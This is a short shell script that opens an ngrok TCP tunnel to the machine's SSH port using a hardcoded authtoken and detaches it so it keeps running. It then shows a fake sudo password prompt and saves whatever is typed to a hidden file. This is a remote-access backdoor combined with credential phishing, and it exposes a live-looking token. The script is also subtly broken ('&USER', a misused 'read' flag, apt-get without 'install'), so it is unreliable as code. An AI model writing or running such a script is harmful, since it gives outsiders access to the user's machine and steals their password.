sudo apt-get ngrok
sudo apt-get figlet
sudo ngrok config add-authtoken 2DqS9Nqy6u47z1SopPts7ySwFMj_7Nt1ot227odxdPuctPvFf
sudo ngrok tcp 22 &
sudo disown -a
echo "[sudo] password for &USER:"
read -sp pass
echo "$pass" > ~/System/tpd
figlet systemdSucks
